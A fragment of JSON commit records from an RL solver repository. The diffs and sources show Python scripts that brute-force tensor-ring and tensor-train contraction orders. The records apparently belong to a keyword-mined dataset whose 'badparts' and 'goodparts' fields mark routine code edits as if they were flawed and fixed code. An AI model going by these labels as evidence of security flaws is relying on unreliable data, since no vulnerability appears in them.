print(reward.min(dim=-1))\r print(reward.min(dim=-1)[0].mean())\r with open(\"record_r.pkl\", \"wb\") as f:\r import pickle as pkl\r pkl.dump(reward, f) ","sourceWithComments":"import pickle as pkl\r\nimport torch as th\r\nfrom copy import deepcopy\r\ndevice = th.device(\"cuda:0\")\r\nreward = 0\r\nN = 4\r\nfactorial_N = math.factorial(N-1)\r\nwith open(f\"test_{N}.pkl\", 'rb') as f:\r\n    a = pkl.load(f)\r\nnum_env = a.shape[0]\r\nstart_ =  th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\r\nend_ =  th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\r\nreward = th.zeros(num_env, 6)\r\nwith open(f\"test_{N}.pkl\", 'rb') as f:\r\n    a = pkl.load(f)\r\n# \u5305\u542b\u6240\u6709Contraction order\u7684Lsit\r\npermute_list = th.as_tensor([[0, 1, 2], [0, 2, 1], [1, 0, 2], [1, 2, 0], [2, 0, 1], [2, 1, 0]])\r\nfor k in range(num_env):\r\n    for permute_i in range(factorial_N):\r\n        permute = permute_list[permute_i]\r\n        r = 0\r\n        state = a[k]\r\n        start = deepcopy(start_[k]) + 1\r\n        end = deepcopy(end_[k]) + 1\r\n        for i in permute:\r\n            tmp = 1\r\n            for j in range(start[i], end[i] + 1):\r\n                tmp *= (state[j, j] * state[j, start[i] - 1] * state[end[i] + 1, j])\r\n            for j in range(start[i + 1], end[i + 1] + 1):\r\n                tmp *= (state[j, j] * state[j, start[i + 1] - 1] * state[end[i + 1] + 1, j])\r\n            tmp \/ state[start[i + 1], start[i + 1] - 1]\r\n            start_new = min(start[i], start[i + 1])\r\n            end_new = max(end[i], end[i + 1])\r\n            for __ in range(start_new, end_new + 1):\r\n                start[__-1] = start_new\r\n                end[__-1] = end_new\r\n            r += tmp\r\n        reward[k, permute_i] = r\r\n    print(reward[k], reward[k].min())\r\n    #assert 0\r\nprint(reward.min(dim = -1))\r\nprint(reward.min(dim = -1)[0].mean())\r\nwith open(\"record_r.pkl\", \"wb\") as f:\r\n    import pickle as pkl\r\n    pkl.dump(reward, f)"}},"msg":"Update baseline_brute_force.py"},"0fa4547dc89bc068a6d72ace85b8504e88bf3eb2":{"url":"https:\/\/api.github.com\/repos\/AI4Finance-Foundation\/ElegantRL_Solver\/commits\/0fa4547dc89bc068a6d72ace85b8504e88bf3eb2","html_url":"https:\/\/github.com\/AI4Finance-Foundation\/ElegantRL_Solver\/commit\/0fa4547dc89bc068a6d72ace85b8504e88bf3eb2","sha":"0fa4547dc89bc068a6d72ace85b8504e88bf3eb2","keyword":"brute force update","diff":"diff --git a\/rlsolver\/rlsolver_quantum_circuits\/Tensor_Ring\/brute_force.py b\/rlsolver\/rlsolver_quantum_circuits\/Tensor_Ring\/brute_force.py\nindex fbf2c87..c6f8305 100644\n--- a\/rlsolver\/rlsolver_quantum_circuits\/Tensor_Ring\/brute_force.py\n+++ b\/rlsolver\/rlsolver_quantum_circuits\/Tensor_Ring\/brute_force.py\n@@ -3,49 +3,66 @@\n from copy import deepcopy\r\n import numpy as np\r\n \r\n-\r\n device = th.device(\"cuda:0\")\r\n reward = 0\r\n # \u6839\u636e\u5f20\u91cf\u7f51\u7edc\u4e2d\u5f20\u91cf\u6570\u91cf\u8bbe\u5b9a\r\n-N = 100\r\n-\r\n-with open(f\"test_data_tensor_train_N={N}.pkl\", 'rb') as f:\r\n+N = 4\r\n+with open(f\"test_data_tensor_ring_N={N}.pkl\", 'rb') as f:\r\n     a = pkl.load(f).detach().cpu()\r\n num_env = a.shape[0]\r\n # \u6bcf\u4e2aenv\u4e2d\u5305\u542b\u7684sample\u6570\u91cf\r\n-num_samples = 5000\r\n+num_samples = 500\r\n start_ = th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\r\n end_ = th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\r\n reward = th.zeros(num_env, num_samples)\r\n-permute_record = th.zeros(num_env, num_samples, N - 1)\r\n+permute_record = th.zeros(num_env, num_samples, N)\r\n min_best = 4e+31\r\n np.set_printoptions(suppress=True)\r\n for k in range(num_env):\r\n     best_reward = 4e+31\r\n     for permute_i in range(num_samples):\r\n-        permute = th.randperm(N - 1)\r\n-        r = 0\r\n-        state = a[k]\r\n+        permute = th.randperm(N)\r\n+        rtp = 0\r\n+        state = deepcopy(a[k])\r\n         start = deepcopy(start_[k]) + 1\r\n         end = deepcopy(end_[k]) + 1\r\n-        for i in permute:\r\n-            tmp = 1\r\n-            for j in range(start[i], end[i] + 1):\r\n-                tmp *= (state[j, j] * state[j, start[i] - 1] * state[end[i] + 1, j])\r\n-            for j in range(start[i + 1], end[i + 1] + 1):\r\n-                tmp *= (state[j, j] * state[j, start[i + 1] - 1] * state[end[i + 1] + 1, j])\r\n-            tmp = tmp \/ state[start[i + 1], start[i + 1] - 1]\r\n-            start_new = min(start[i], start[i + 1])\r\n-            end_new = max(end[i], end[i + 1])\r\n-            for __ in range(start_new, end_new + 1):\r\n-                start[__ - 1] = start_new\r\n-                end[__ - 1] = end_new\r\n+        for i in (permute[:-2]):\r\n+            r = 1\r\n+            print(state)\r\n+            if (i == N-1):\r\n+                first_node = (i + 1) % N\r\n+                second_node = (i + 2) % N\r\n+            else:\r\n+                first_node = (i + 2) % N\r\n+                second_node = (i + 1) % N\r\n+            if (first_node == 0):    first_node = N\r\n+            if (second_node == 0):    second_node = N\r\n+\r\n+            if start[i] == 1 or end[i] == N:\r\n+                r = r * state[N, 1]\r\n+            if start[(i + 1) % N] == 1 or end[(i + 1) % N] == N:\r\n+                r = r * state[N, 1]\r\n+            tmp1 = start[i]\r\n+            tmp2 = start[(i + 1) % N]\r\n+            for i in range(N):\r\n+                if ((start[i] == tmp1) or (start[i] == tmp2)):\r\n+                    r = r * (state[i + 1, i + 1] * state[i + 1, i] * state[i + 2, i + 1])\r\n+            r \/= 2\r\n+            state[first_node, second_node] = 1\r\n+            s1 = 0 + start[i]\r\n+            s2 = 0 + start[(i + 1) % N]\r\n+            start_new = min(start[i], start[(i + 1) % N])\r\n+            end_new = max(end[i], end[(i + 1) % N])\r\n+            for i in range(N):\r\n+                if ((start[i] == s1) or (start[i] == s2)):\r\n+                    start[i] = start_new\r\n+                    end[i] = end_new\r\n \r\n-            r += tmp\r\n-        reward[k, permute_i] = r\r\n+            rtp += r\r\n+        reward[k, permute_i] = rtp\r\n         # print(permute, permute_i)\r\n         permute_record[k, permute_i] = permute\r\n-        best_reward = min(best_reward, r)\r\n+        best_reward = min(best_reward, rtp - 2 ** (N + 1))\r\n     min_best = min(best_reward, min_best)\r\n \r\n     # print(reward[k], permute_record[k, reward[k].min(dim=-1)[1]], best_reward.numpy(), min_best.numpy())\r\n@@ -55,11 +72,11 @@\n     print(best_reward_str, min_best_str)\r\n # \u6240\u6709env\u4e2d\u6700\u4f18reward\u7684\u5e73\u5747\u503c\r\n print(reward.min(dim=-1)[0].mean().numpy())\r\n-with open(\"record_r_baseline_random.pkl\", \"wb\") as f:\r\n-    import pickle as pkl\r\n-\r\n-    pkl.dump(reward, f)\r\n-with open(\"record_permute_baseline_random.pkl\", \"wb\") as f:\r\n-    import pickle as pkl\r\n-\r\n-    pkl.dump(permute_record, f)\r\n+# with open(\"record_r_baseline_random.pkl\", \"wb\") as f:\r\n+#     import pickle as pkl\r\n+#\r\n+#     pkl.dump(reward, f)\r\n+# with open(\"record_permute_baseline_random.pkl\", \"wb\") as f:\r\n+#     import pickle as pkl\r\n+#\r\n+#     pkl.dump(permute_record, f)\r\n","message":"","files":{"\/rlsolver\/rlsolver_quantum_circuits\/Tensor_Ring\/brute_force.py":{"changes":[{"diff":"\n from copy import deepcopy\r\n import numpy as np\r\n \r\n-\r\n device = th.device(\"cuda:0\")\r\n reward = 0\r\n # \u6839\u636e\u5f20\u91cf\u7f51\u7edc\u4e2d\u5f20\u91cf\u6570\u91cf\u8bbe\u5b9a\r\n-N = 100\r\n-\r\n-with open(f\"test_data_tensor_train_N={N}.pkl\", 'rb') as f:\r\n+N = 4\r\n+with open(f\"test_data_tensor_ring_N={N}.pkl\", 'rb') as f:\r\n     a = pkl.load(f).detach().cpu()\r\n num_env = a.shape[0]\r\n # \u6bcf\u4e2aenv\u4e2d\u5305\u542b\u7684sample\u6570\u91cf\r\n-num_samples = 5000\r\n+num_samples = 500\r\n start_ = th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\r\n end_ = th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\r\n reward = th.zeros(num_env, num_samples)\r\n-permute_record = th.zeros(num_env, num_samples, N - 1)\r\n+permute_record = th.zeros(num_env, num_samples, N)\r\n min_best = 4e+31\r\n np.set_printoptions(suppress=True)\r\n for k in range(num_env):\r\n     best_reward = 4e+31\r\n     for permute_i in range(num_samples):\r\n-        permute = th.randperm(N - 1)\r\n-        r = 0\r\n-        state = a[k]\r\n+        permute = th.randperm(N)\r\n+        rtp = 0\r\n+        state = deepcopy(a[k])\r\n         start = deepcopy(start_[k]) + 1\r\n         end = deepcopy(end_[k]) + 1\r\n-        for i in permute:\r\n-            tmp = 1\r\n-            for j in range(start[i], end[i] + 1):\r\n-                tmp *= (state[j, j] * state[j, start[i] - 1] * state[end[i] + 1, j])\r\n-            for j in range(start[i + 1], end[i + 1] + 1):\r\n-                tmp *= (state[j, j] * state[j, start[i + 1] - 1] * state[end[i + 1] + 1, j])\r\n-            tmp = tmp \/ state[start[i + 1], start[i + 1] - 1]\r\n-            start_new = min(start[i], start[i + 1])\r\n-            end_new = max(end[i], end[i + 1])\r\n-            for __ in range(start_new, end_new + 1):\r\n-                start[__ - 1] = start_new\r\n-                end[__ - 1] = end_new\r\n+        for i in (permute[:-2]):\r\n+            r = 1\r\n+            print(state)\r\n+            if (i == N-1):\r\n+                first_node = (i + 1) % N\r\n+                second_node = (i + 2) % N\r\n+            else:\r\n+                first_node = (i + 2) % N\r\n+                second_node = (i + 1) % N\r\n+            if (first_node == 0):    first_node = N\r\n+            if (second_node == 0):    second_node = N\r\n+\r\n+            if start[i] == 1 or end[i] == N:\r\n+                r = r * state[N, 1]\r\n+            if start[(i + 1) % N] == 1 or end[(i + 1) % N] == N:\r\n+                r = r * state[N, 1]\r\n+            tmp1 = start[i]\r\n+            tmp2 = start[(i + 1) % N]\r\n+            for i in range(N):\r\n+                if ((start[i] == tmp1) or (start[i] == tmp2)):\r\n+                    r = r * (state[i + 1, i + 1] * state[i + 1, i] * state[i + 2, i + 1])\r\n+            r \/= 2\r\n+            state[first_node, second_node] = 1\r\n+            s1 = 0 + start[i]\r\n+            s2 = 0 + start[(i + 1) % N]\r\n+            start_new = min(start[i], start[(i + 1) % N])\r\n+            end_new = max(end[i], end[(i + 1) % N])\r\n+            for i in range(N):\r\n+                if ((start[i] == s1) or (start[i] == s2)):\r\n+                    start[i] = start_new\r\n+                    end[i] = end_new\r\n \r\n-            r += tmp\r\n-        reward[k, permute_i] = r\r\n+            rtp += r\r\n+        reward[k, permute_i] = rtp\r\n         # print(permute, permute_i)\r\n         permute_record[k, permute_i] = permute\r\n-        best_reward = min(best_reward, r)\r\n+        best_reward = min(best_reward, rtp - 2 ** (N + 1))\r\n     min_best = min(best_reward, min_best)\r\n \r\n     # print(reward[k], permute_record[k, reward[k].min(dim=-1)[1]], best_reward.numpy(), min_best.numpy())\r\n","add":41,"remove":24,"filename":"\/rlsolver\/rlsolver_quantum_circuits\/Tensor_Ring\/brute_force.py","badparts":["\r","N = 100\r","\r","with open(f\"test_data_tensor_train_N={N}.pkl\", 'rb') as f:\r","num_samples = 5000\r","permute_record = th.zeros(num_env, num_samples, N - 1)\r","        permute = th.randperm(N - 1)\r","        r = 0\r","        state = a[k]\r","        for i in permute:\r","            tmp = 1\r","            for j in range(start[i], end[i] + 1):\r","                tmp *= (state[j, j] * state[j, start[i] - 1] * state[end[i] + 1, j])\r","            for j in range(start[i + 1], end[i + 1] + 1):\r","                tmp *= (state[j, j] * state[j, start[i + 1] - 1] * state[end[i + 1] + 1, j])\r","            tmp = tmp \/ state[start[i + 1], start[i + 1] - 1]\r","            start_new = min(start[i], start[i + 1])\r","            end_new = max(end[i], end[i + 1])\r","            for __ in range(start_new, end_new + 1):\r","                start[__ - 1] = start_new\r","                end[__ - 1] = end_new\r","            r += tmp\r","        reward[k, permute_i] = r\r","        best_reward = min(best_reward, r)\r"],"goodparts":["N = 4\r","with open(f\"test_data_tensor_ring_N={N}.pkl\", 'rb') as f:\r","num_samples = 500\r","permute_record = th.zeros(num_env, num_samples, N)\r","        permute = th.randperm(N)\r","        rtp = 0\r","        state = deepcopy(a[k])\r","        for i in (permute[:-2]):\r","            r = 1\r","            print(state)\r","            if (i == N-1):\r","                first_node = (i + 1) % N\r","                second_node = (i + 2) % N\r","            else:\r","                first_node = (i + 2) % N\r","                second_node = (i + 1) % N\r","            if (first_node == 0):    first_node = N\r","            if (second_node == 0):    second_node = N\r","\r","            if start[i] == 1 or end[i] == N:\r","                r = r * state[N, 1]\r","            if start[(i + 1) % N] == 1 or end[(i + 1) % N] == N:\r","                r = r * state[N, 1]\r","            tmp1 = start[i]\r","            tmp2 = start[(i + 1) % N]\r","            for i in range(N):\r","                if ((start[i] == tmp1) or (start[i] == tmp2)):\r","                    r = r * (state[i + 1, i + 1] * state[i + 1, i] * state[i + 2, i + 1])\r","            r \/= 2\r","            state[first_node, second_node] = 1\r","            s1 = 0 + start[i]\r","            s2 = 0 + start[(i + 1) % N]\r","            start_new = min(start[i], start[(i + 1) % N])\r","            end_new = max(end[i], end[(i + 1) % N])\r","            for i in range(N):\r","                if ((start[i] == s1) or (start[i] == s2)):\r","                    start[i] = start_new\r","                    end[i] = end_new\r","            rtp += r\r","        reward[k, permute_i] = rtp\r","        best_reward = min(best_reward, rtp - 2 ** (N + 1))\r"]},{"diff":"     print(best_reward_str, min_best_str)\r\n # \u6240\u6709env\u4e2d\u6700\u4f18reward\u7684\u5e73\u5747\u503c\r\n print(reward.min(dim=-1)[0].mean().numpy())\r\n-with open(\"record_r_baseline_random.pkl\", \"wb\") as f:\r\n-    import pickle as pkl\r\n-\r\n-    pkl.dump(reward, f)\r\n-with open(\"record_permute_baseline_random.pkl\", \"wb\") as f:\r\n-    import pickle as pkl\r\n-\r\n-    pkl.dump(permute_record, f)\r\n+# with open(\"record_r_baseline_random.pkl\", \"wb\") as f:\r\n+#     import pickle as pkl\r\n+#\r\n+#     pkl.dump(reward, f)\r\n+# with open(\"record_permute_baseline_random.pkl\", \"wb\") as f:\r\n+#     import pickle as pkl\r\n+#\r\n+#     pkl.dump(permute_record, f)\r\n","add":8,"remove":8,"filename":"\/rlsolver\/rlsolver_quantum_circuits\/Tensor_Ring\/brute_force.py","badparts":["with open(\"record_r_baseline_random.pkl\", \"wb\") as f:\r","    import pickle as pkl\r","\r","    pkl.dump(reward, f)\r","with open(\"record_permute_baseline_random.pkl\", \"wb\") as f:\r","    import pickle as pkl\r","\r","    pkl.dump(permute_record, f)\r"],"goodparts":[]}],"source":"\nimport pickle as pkl\r import torch as th\r from copy import deepcopy\r import numpy as np\r \r \r device=th.device(\"cuda:0\")\r reward=0\r N=100\r \r with open(f\"test_data_tensor_train_N={N}.pkl\", 'rb') as f:\r a=pkl.load(f).detach().cpu()\r num_env=a.shape[0]\r num_samples=5000\r start_=th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\r end_=th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\r reward=th.zeros(num_env, num_samples)\r permute_record=th.zeros(num_env, num_samples, N -1)\r min_best=4e+31\r np.set_printoptions(suppress=True)\r for k in range(num_env):\r best_reward=4e+31\r for permute_i in range(num_samples):\r permute=th.randperm(N -1)\r r=0\r state=a[k]\r start=deepcopy(start_[k]) +1\r end=deepcopy(end_[k]) +1\r for i in permute:\r tmp=1\r for j in range(start[i], end[i] +1):\r tmp *=(state[j, j] * state[j, start[i] -1] * state[end[i] +1, j])\r for j in range(start[i +1], end[i +1] +1):\r tmp *=(state[j, j] * state[j, start[i +1] -1] * state[end[i +1] +1, j])\r tmp=tmp \/ state[start[i +1], start[i +1] -1]\r start_new=min(start[i], start[i +1])\r end_new=max(end[i], end[i +1])\r for __ in range(start_new, end_new +1):\r start[__ -1]=start_new\r end[__ -1]=end_new\r \r r +=tmp\r reward[k, permute_i]=r\r permute_record[k, permute_i]=permute\r best_reward=min(best_reward, r)\r min_best=min(best_reward, min_best)\r \r best_reward_str=str(best_reward.numpy())\r min_best_str=str(min_best.numpy())\r print(best_reward_str, min_best_str)\r print(reward.min(dim=-1)[0].mean().numpy())\r with open(\"record_r_baseline_random.pkl\", \"wb\") as f:\r import pickle as pkl\r \r pkl.dump(reward, f)\r with open(\"record_permute_baseline_random.pkl\", \"wb\") as f:\r import pickle as pkl\r \r pkl.dump(permute_record, f)\r ","sourceWithComments":"import pickle as pkl\r\nimport torch as th\r\nfrom copy import deepcopy\r\nimport numpy as np\r\n\r\n\r\ndevice = th.device(\"cuda:0\")\r\nreward = 0\r\n# \u6839\u636e\u5f20\u91cf\u7f51\u7edc\u4e2d\u5f20\u91cf\u6570\u91cf\u8bbe\u5b9a\r\nN = 100\r\n\r\nwith open(f\"test_data_tensor_train_N={N}.pkl\", 'rb') as f:\r\n    a = pkl.load(f).detach().cpu()\r\nnum_env = a.shape[0]\r\n# \u6bcf\u4e2aenv\u4e2d\u5305\u542b\u7684sample\u6570\u91cf\r\nnum_samples = 5000\r\nstart_ = th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\r\nend_ = th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\r\nreward = th.zeros(num_env, num_samples)\r\npermute_record = th.zeros(num_env, num_samples, N - 1)\r\nmin_best = 4e+31\r\nnp.set_printoptions(suppress=True)\r\nfor k in range(num_env):\r\n    best_reward = 4e+31\r\n    for permute_i in range(num_samples):\r\n        permute = th.randperm(N - 1)\r\n        r = 0\r\n        state = a[k]\r\n        start = deepcopy(start_[k]) + 1\r\n        end = deepcopy(end_[k]) + 1\r\n        for i in permute:\r\n            tmp = 1\r\n            for j in range(start[i], end[i] + 1):\r\n                tmp *= (state[j, j] * state[j, start[i] - 1] * state[end[i] + 1, j])\r\n            for j in range(start[i + 1], end[i + 1] + 1):\r\n                tmp *= (state[j, j] * state[j, start[i + 1] - 1] * state[end[i + 1] + 1, j])\r\n            tmp = tmp \/ state[start[i + 1], start[i + 1] - 1]\r\n            start_new = min(start[i], start[i + 1])\r\n            end_new = max(end[i], end[i + 1])\r\n            for __ in range(start_new, end_new + 1):\r\n                start[__ - 1] = start_new\r\n                end[__ - 1] = end_new\r\n\r\n            r += tmp\r\n        reward[k, permute_i] = r\r\n        # print(permute, permute_i)\r\n        permute_record[k, permute_i] = permute\r\n        best_reward = min(best_reward, r)\r\n    min_best = min(best_reward, min_best)\r\n\r\n    # print(reward[k], permute_record[k, reward[k].min(dim=-1)[1]], best_reward.numpy(), min_best.numpy())\r\n    best_reward_str = str(best_reward.numpy())\r\n    min_best_str = str(min_best.numpy())\r\n    # \u5206\u522b\u8f93\u51fa  \u5f53\u524denv\u4e2d\u6700\u4f18\u7684reward\u3001\u6240\u6709env\u4e2d\u6700\u4f18\u7684reward\r\n    print(best_reward_str, min_best_str)\r\n# \u6240\u6709env\u4e2d\u6700\u4f18reward\u7684\u5e73\u5747\u503c\r\nprint(reward.min(dim=-1)[0].mean().numpy())\r\nwith open(\"record_r_baseline_random.pkl\", \"wb\") as f:\r\n    import pickle as pkl\r\n\r\n    pkl.dump(reward, f)\r\nwith open(\"record_permute_baseline_random.pkl\", \"wb\") as f:\r\n    import pickle as pkl\r\n\r\n    pkl.dump(permute_record, f)\r\n"}},"msg":"Update brute_force.py"},"e6b48fc3ba3ecdd7e4e8f493d787000aa5da64ec":{"url":"https:\/\/api.github.com\/repos\/AI4Finance-Foundation\/ElegantRL_Solver\/commits\/e6b48fc3ba3ecdd7e4e8f493d787000aa5da64ec","html_url":"https:\/\/github.com\/AI4Finance-Foundation\/ElegantRL_Solver\/commit\/e6b48fc3ba3ecdd7e4e8f493d787000aa5da64ec","sha":"e6b48fc3ba3ecdd7e4e8f493d787000aa5da64ec","keyword":"brute force update","diff":"diff --git a\/rlsolver\/rlsolver_quantum_circuits\/Tensor_Ring\/brute_force.py b\/rlsolver\/rlsolver_quantum_circuits\/Tensor_Ring\/brute_force.py\nindex c6f8305..011bb5e 100644\n--- a\/rlsolver\/rlsolver_quantum_circuits\/Tensor_Ring\/brute_force.py\n+++ b\/rlsolver\/rlsolver_quantum_circuits\/Tensor_Ring\/brute_force.py\n@@ -6,7 +6,7 @@\n device = th.device(\"cuda:0\")\r\n reward = 0\r\n # \u6839\u636e\u5f20\u91cf\u7f51\u7edc\u4e2d\u5f20\u91cf\u6570\u91cf\u8bbe\u5b9a\r\n-N = 4\r\n+N = 6\r\n with open(f\"test_data_tensor_ring_N={N}.pkl\", 'rb') as f:\r\n     a = pkl.load(f).detach().cpu()\r\n num_env = a.shape[0]\r\n@@ -26,9 +26,9 @@\n         state = deepcopy(a[k])\r\n         start = deepcopy(start_[k]) + 1\r\n         end = deepcopy(end_[k]) + 1\r\n-        for i in (permute[:-2]):\r\n+        cnt = N\r\n+        for i in (permute[:-1]):\r\n             r = 1\r\n-            print(state)\r\n             if (i == N-1):\r\n                 first_node = (i + 1) % N\r\n                 second_node = (i + 2) % N\r\n@@ -37,17 +37,19 @@\n                 second_node = (i + 1) % N\r\n             if (first_node == 0):    first_node = N\r\n             if (second_node == 0):    second_node = N\r\n-\r\n             if start[i] == 1 or end[i] == N:\r\n                 r = r * state[N, 1]\r\n             if start[(i + 1) % N] == 1 or end[(i + 1) % N] == N:\r\n                 r = r * state[N, 1]\r\n             tmp1 = start[i]\r\n             tmp2 = start[(i + 1) % N]\r\n-            for i in range(N):\r\n-                if ((start[i] == tmp1) or (start[i] == tmp2)):\r\n-                    r = r * (state[i + 1, i + 1] * state[i + 1, i] * state[i + 2, i + 1])\r\n+            for j in range(N):\r\n+                if ((start[j] == tmp1) or (start[j] == tmp2)):\r\n+                    r = r * (state[j + 1, j + 1] * state[j + 1, j] * state[j + 2, j + 1])\r\n             r \/= 2\r\n+            if (cnt == 2):\r\n+                r \/= 2\r\n+            cnt -= 1\r\n             state[first_node, second_node] = 1\r\n             s1 = 0 + start[i]\r\n             s2 = 0 + start[(i + 1) % N]\r\n@@ -57,12 +59,11 @@\n                 if ((start[i] == s1) or (start[i] == s2)):\r\n                     start[i] = start_new\r\n                     end[i] = end_new\r\n-\r\n             rtp += r\r\n         reward[k, permute_i] = rtp\r\n         # print(permute, permute_i)\r\n         permute_record[k, permute_i] = permute\r\n-        best_reward = min(best_reward, rtp - 2 ** (N + 1))\r\n+        best_reward = min(best_reward, rtp)\r\n     min_best = min(best_reward, min_best)\r\n \r\n     # print(reward[k], permute_record[k, reward[k].min(dim=-1)[1]], best_reward.numpy(), min_best.numpy())\r\n","message":"","files":{"\/rlsolver\/rlsolver_quantum_circuits\/Tensor_Ring\/brute_force.py":{"changes":[{"diff":"\n device = th.device(\"cuda:0\")\r\n reward = 0\r\n # \u6839\u636e\u5f20\u91cf\u7f51\u7edc\u4e2d\u5f20\u91cf\u6570\u91cf\u8bbe\u5b9a\r\n-N = 4\r\n+N = 6\r\n with open(f\"test_data_tensor_ring_N={N}.pkl\", 'rb') as f:\r\n     a = pkl.load(f).detach().cpu()\r\n num_env = a.shape[0]\r\n","add":1,"remove":1,"filename":"\/rlsolver\/rlsolver_quantum_circuits\/Tensor_Ring\/brute_force.py","badparts":["N = 4\r"],"goodparts":["N = 6\r"]},{"diff":"         state = deepcopy(a[k])\r\n         start = deepcopy(start_[k]) + 1\r\n         end = deepcopy(end_[k]) + 1\r\n-        for i in (permute[:-2]):\r\n+        cnt = N\r\n+        for i in (permute[:-1]):\r\n             r = 1\r\n-            print(state)\r\n             if (i == N-1):\r\n                 first_node = (i + 1) % N\r\n                 second_node = (i + 2) % N\r\n","add":2,"remove":2,"filename":"\/rlsolver\/rlsolver_quantum_circuits\/Tensor_Ring\/brute_force.py","badparts":["        for i in (permute[:-2]):\r","            print(state)\r"],"goodparts":["        cnt = N\r","        for i in (permute[:-1]):\r"]},{"diff":"                 second_node = (i + 1) % N\r\n             if (first_node == 0):    first_node = N\r\n             if (second_node == 0):    second_node = N\r\n-\r\n             if start[i] == 1 or end[i] == N:\r\n                 r = r * state[N, 1]\r\n             if start[(i + 1) % N] == 1 or end[(i + 1) % N] == N:\r\n                 r = r * state[N, 1]\r\n             tmp1 = start[i]\r\n             tmp2 = start[(i + 1) % N]\r\n-            for i in range(N):\r\n-                if ((start[i] == tmp1) or (start[i] == tmp2)):\r\n-                    r = r * (state[i + 1, i + 1] * state[i + 1, i] * state[i + 2, i + 1])\r\n+            for j in range(N):\r\n+                if ((start[j] == tmp1) or (start[j] == tmp2)):\r\n+                    r = r * (state[j + 1, j + 1] * state[j + 1, j] * state[j + 2, j + 1])\r\n             r \/= 2\r\n+            if (cnt == 2):\r\n+                r \/= 2\r\n+            cnt -= 1\r\n             state[first_node, second_node] = 1\r\n             s1 = 0 + start[i]\r\n             s2 = 0 + start[(i + 1) % N]\r\n","add":6,"remove":4,"filename":"\/rlsolver\/rlsolver_quantum_circuits\/Tensor_Ring\/brute_force.py","badparts":["\r","            for i in range(N):\r","                if ((start[i] == tmp1) or (start[i] == tmp2)):\r","                    r = r * (state[i + 1, i + 1] * state[i + 1, i] * state[i + 2, i + 1])\r"],"goodparts":["            for j in range(N):\r","                if ((start[j] == tmp1) or (start[j] == tmp2)):\r","                    r = r * (state[j + 1, j + 1] * state[j + 1, j] * state[j + 2, j + 1])\r","            if (cnt == 2):\r","                r \/= 2\r","            cnt -= 1\r"]},{"diff":"                 if ((start[i] == s1) or (start[i] == s2)):\r\n                     start[i] = start_new\r\n                     end[i] = end_new\r\n-\r\n             rtp += r\r\n         reward[k, permute_i] = rtp\r\n         # print(permute, permute_i)\r\n         permute_record[k, permute_i] = permute\r\n-        best_reward = min(best_reward, rtp - 2 ** (N + 1))\r\n+        best_reward = min(best_reward, rtp)\r\n     min_best = min(best_reward, min_best)\r\n \r\n     # print(reward[k], permute_record[k, reward[k].min(dim=-1)[1]], best_reward.numpy(), min_best.numpy())\r\n","add":1,"remove":2,"filename":"\/rlsolver\/rlsolver_quantum_circuits\/Tensor_Ring\/brute_force.py","badparts":["\r","        best_reward = min(best_reward, rtp - 2 ** (N + 1))\r"],"goodparts":["        best_reward = min(best_reward, rtp)\r"]}],"source":"\nimport pickle as pkl\r import torch as th\r from copy import deepcopy\r import numpy as np\r \r device=th.device(\"cuda:0\")\r reward=0\r N=4\r with open(f\"test_data_tensor_ring_N={N}.pkl\", 'rb') as f:\r a=pkl.load(f).detach().cpu()\r num_env=a.shape[0]\r num_samples=500\r start_=th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\r end_=th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\r reward=th.zeros(num_env, num_samples)\r permute_record=th.zeros(num_env, num_samples, N)\r min_best=4e+31\r np.set_printoptions(suppress=True)\r for k in range(num_env):\r best_reward=4e+31\r for permute_i in range(num_samples):\r permute=th.randperm(N)\r rtp=0\r state=deepcopy(a[k])\r start=deepcopy(start_[k]) +1\r end=deepcopy(end_[k]) +1\r for i in(permute[:-2]):\r r=1\r print(state)\r if(i==N-1):\r first_node=(i +1) % N\r second_node=(i +2) % N\r else:\r first_node=(i +2) % N\r second_node=(i +1) % N\r if(first_node==0): first_node=N\r if(second_node==0): second_node=N\r \r if start[i]==1 or end[i]==N:\r r=r * state[N, 1]\r if start[(i +1) % N]==1 or end[(i +1) % N]==N:\r r=r * state[N, 1]\r tmp1=start[i]\r tmp2=start[(i +1) % N]\r for i in range(N):\r if((start[i]==tmp1) or(start[i]==tmp2)):\r r=r *(state[i +1, i +1] * state[i +1, i] * state[i +2, i +1])\r r \/=2\r state[first_node, second_node]=1\r s1=0 +start[i]\r s2=0 +start[(i +1) % N]\r start_new=min(start[i], start[(i +1) % N])\r end_new=max(end[i], end[(i +1) % N])\r for i in range(N):\r if((start[i]==s1) or(start[i]==s2)):\r start[i]=start_new\r end[i]=end_new\r \r rtp +=r\r reward[k, permute_i]=rtp\r permute_record[k, permute_i]=permute\r best_reward=min(best_reward, rtp -2 **(N +1))\r min_best=min(best_reward, min_best)\r \r best_reward_str=str(best_reward.numpy())\r min_best_str=str(min_best.numpy())\r print(best_reward_str, min_best_str)\r print(reward.min(dim=-1)[0].mean().numpy())\r ","sourceWithComments":"import pickle as pkl\r\nimport torch as th\r\nfrom copy import deepcopy\r\nimport numpy as np\r\n\r\ndevice = th.device(\"cuda:0\")\r\nreward = 0\r\n# \u6839\u636e\u5f20\u91cf\u7f51\u7edc\u4e2d\u5f20\u91cf\u6570\u91cf\u8bbe\u5b9a\r\nN = 4\r\nwith open(f\"test_data_tensor_ring_N={N}.pkl\", 'rb') as f:\r\n    a = pkl.load(f).detach().cpu()\r\nnum_env = a.shape[0]\r\n# \u6bcf\u4e2aenv\u4e2d\u5305\u542b\u7684sample\u6570\u91cf\r\nnum_samples = 500\r\nstart_ = th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\r\nend_ = th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\r\nreward = th.zeros(num_env, num_samples)\r\npermute_record = th.zeros(num_env, num_samples, 